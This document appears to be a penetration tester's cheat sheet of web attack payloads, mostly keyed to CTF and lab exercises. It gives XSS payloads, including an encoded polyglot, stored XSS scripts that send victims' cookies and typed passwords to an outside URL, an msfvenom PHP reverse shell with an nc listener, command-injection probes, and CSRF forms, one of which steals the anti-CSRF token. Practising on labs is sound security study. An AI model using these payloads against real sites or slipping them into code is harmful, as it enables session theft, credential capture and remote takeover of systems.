# XSS
### XSS Hunter
`
https://xsshunter.com/
`
### XSS Polyglot (decode to get actual payload)
`
amFWYXNDcmlwdDovKi0vKmAvKlxgLyonLyoiLyoqLygvKiAqL29uZXJyb3I9YWxlcnQoJ1RITScpICkvLyUwRCUwQSUwZCUwYS8vPC9zdFlsZS88L3RpdExlLzwvdGVYdGFyRWEvPC9zY1JpcHQvLS0hPlx4M2NzVmcvPHNWZy9vTmxvQWQ9YWxlcnQoJ1RITScpLy8+XHgzZQ==
`
### Stored XSS
#### Steal cookie
`<script>
fetch('URL', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>`

#### Capture other users information
`<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('URL',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">`

#### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

`http://foo?&apos;-alert(1)-&apos;`

### Reflected XSS
#### Reflected XSS into attribute with angle brackets HTML-encoded

`"onmouseover="alert(1)`

#### Reflected with `"` escapsed

`\"-alert(1)}//`

#### Reflected XSS into HTML context with most tags and attributes blocked

`<$tag$ $attribute$> Using Burp Suite Intruder`

#### Reflected XSS into a JavaScript string with single quote and backslash escaped

`</script><script>alert(1)</script>`

#### Reflected XSS with some SVG animate transform

`<svg><animatetransform onbegin=alert(1)>`

#### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

`\'-alert(1)//`

Explain: 

If user input is `alert('1')`

`var a = "alert(\'1\')"`

To bypass escaped, instead of inserting `, we will use `\'`.

`a = '\\' // a = character (\)`


#### Reflected XSS into HTML context with all tags blocked except custom ones
`<xss id="element-id" onclick="alert(1)" tabindex=1>#element-id`

[Why we use tabIndex here?](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/tabindex)

Why we add `#element-id` at the end?

The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called. 

#### Reflected XSS in `canonical` link tag
[About canonical link tag](https://ahrefs.com/blog/canonical-tags/) -> We will exploit by break href attribute

#### Reflected XSS with SVG Animate

``
<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click me</text></a>'</svg>
``

### DOM XSS
#### DOM XSS in `innerHTML`  sink using source `location.search`
`<img src=1 onerror=alert(1)>`

#### DOM XSS in jQuery selector sink using a change event
`<iframe src="URL" onload="this.src+='xss'"></iframe>`

#### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
[XSS Angular JS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)

# RFI
### Shell generation
`msfvenom -p php/reverse_php lport=4444 lhost=<your ip > /path/to/shell`

### Start listen on port
`cd /path/to/shell`

`sudo python3 -m http.server`

`nc -lvp 4444`                 


# Command Injection
Use one of the following commands to test command injection. Or you can use `Burp Suite Intruder` with this [payload](https://github.com/payloadbox/command-injection-payload-list).
### Blind
`ping`

`>` forcing some output && `cat`

`curl` great way

### Verbose
#### Linux
`whoami` || `ls` || `ping` || `sleep` ||  `nc`

#### Windows
`whoami` || `dir` || `ping` || `timeout`

### CSRF 
#### Simple payload
Access [this challenge](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection)
```
<iframe style="display:none" name="csrf-frame"></iframe>
    <form  id="csrf-form" target="csrf-frame" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="username" value="ad" />
      <input type="hidden" name="status" value="on" />
      <input type="submit" value="Submit request" />
    </form>
<script>document.getElementById("csrf-form").submit()</script>
```

#### Token Bypass
Sample payload for bypassing CSRF Token. Access [this challenge](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
